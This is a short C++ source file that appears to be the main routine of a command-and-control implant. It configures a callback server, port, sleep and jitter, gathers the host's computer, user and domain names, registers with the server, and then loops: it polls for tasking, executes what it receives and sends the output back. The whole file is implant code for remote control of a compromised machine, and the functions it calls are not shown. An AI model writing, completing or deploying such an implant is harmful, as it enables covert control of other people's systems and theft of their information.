
#include "Core.h"
#include "Tasking.h"
#include "Helper.h"
#include "HTTP.h"


int main() {


	State state;

	state.running = true;
	state.domain = CALLBACK_SERVER;
	state.file = CALLBACK_ENDPOINT;
	state.port = CALLBACK_PORT;
	state.sleep = DEFAULT_SLEEP;
	state.jitter = DEFAULT_JITTER;
	state.usessl = false;

	
	GetInfo(state.cname, state.uname, state.udomain);
	prep(&state);

	regimp(&state);
	
	if (state.uuid.empty()) {
		
		Sleep(60 * (1000)); // sleeps for a minute and keeps trying to register over and over and over
		regimp(&state);

	}

	
	std::string inbound;
	std::string outbound;
	
	while (state.running) {
	
		if (!Callback(state, inbound, outbound))
			printf("Error performing callback!");

		if (!inbound.empty())
			outbound = ExecuteTasking(state, inbound);
		
		else
			Sleep(state.sleep * (1000));
	}

	return 0;

}